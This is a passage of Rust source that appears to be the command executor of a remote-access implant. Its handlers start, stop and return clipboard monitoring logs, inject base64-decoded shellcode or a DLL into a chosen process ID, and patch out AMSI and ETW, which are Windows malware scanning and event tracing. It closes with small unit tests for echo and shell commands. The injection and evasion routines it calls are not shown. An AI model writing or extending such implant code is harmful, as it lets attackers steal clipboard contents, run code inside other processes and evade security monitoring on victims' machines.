    async fn clipboard_stop() -> CommandResult {
        let monitor = get_clipboard_monitor();
        monitor.stop().await;
        CommandResult {
            command_type: "clipboard_stop".to_string(),
            status: "success".to_string(),
            output: "Clipboard monitoring stopped".to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn clipboard_logs() -> CommandResult {
        let monitor = get_clipboard_monitor();
        let logs = monitor.get_logs().await;
        let output = serde_json::to_string_pretty(&logs).unwrap_or_else(|_| "[]".to_string());
        CommandResult {
            command_type: "clipboard_logs".to_string(),
            status: "success".to_string(),
            output,
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn inject_shellcode(pid: u32, shellcode_b64: &str) -> CommandResult {
        let start = Instant::now();
        match base64::engine::general_purpose::STANDARD.decode(shellcode_b64) {
            Ok(shellcode) => {
                match crate::injection::ProcessInjector::inject_shellcode(pid, &shellcode) {
                    Ok(msg) => CommandResult { command_type: "inject_shellcode".into(), status: "success".into(), output: msg, error: None, execution_time_ms: start.elapsed().as_millis() },
                    Err(e) => CommandResult { command_type: "inject_shellcode".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: start.elapsed().as_millis() },
                }
            }
            Err(e) => CommandResult { command_type: "inject_shellcode".into(), status: "error".into(), output: String::new(), error: Some(format!("Base64 decode failed: {}", e)), execution_time_ms: start.elapsed().as_millis() },
        }
    }

    async fn inject_dll(pid: u32, dll_path: &str) -> CommandResult {
        let start = Instant::now();
        match crate::injection::ProcessInjector::inject_dll(pid, dll_path) {
            Ok(msg) => CommandResult { command_type: "inject_dll".into(), status: "success".into(), output: msg, error: None, execution_time_ms: start.elapsed().as_millis() },
            Err(e) => CommandResult { command_type: "inject_dll".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: start.elapsed().as_millis() },
        }
    }

    async fn amsi_bypass() -> CommandResult {
        match crate::evasion::AmsiBypass::patch() {
            Ok(msg) => CommandResult { command_type: "amsi_bypass".into(), status: "success".into(), output: msg, error: None, execution_time_ms: 0 },
            Err(e) => CommandResult { command_type: "amsi_bypass".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: 0 },
        }
    }

    async fn etw_bypass() -> CommandResult {
        match crate::evasion::EtwBypass::patch() {
            Ok(msg) => CommandResult { command_type: "etw_bypass".into(), status: "success".into(), output: msg, error: None, execution_time_ms: 0 },
            Err(e) => CommandResult { command_type: "etw_bypass".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: 0 },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_echo_command() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let cmd = CommandType::Echo {
                message: "Hello, World!".to_string(),
            };
            let result = Executor::execute_command(&cmd).await;
            assert_eq!(result.status, "success");
        });
    }

    #[test]
    fn test_command_creation() {
        let cmd = CommandType::Shell {
            command: "echo test".to_string(),
        };
        println!("Command created: {:?}", cmd);
    }
}
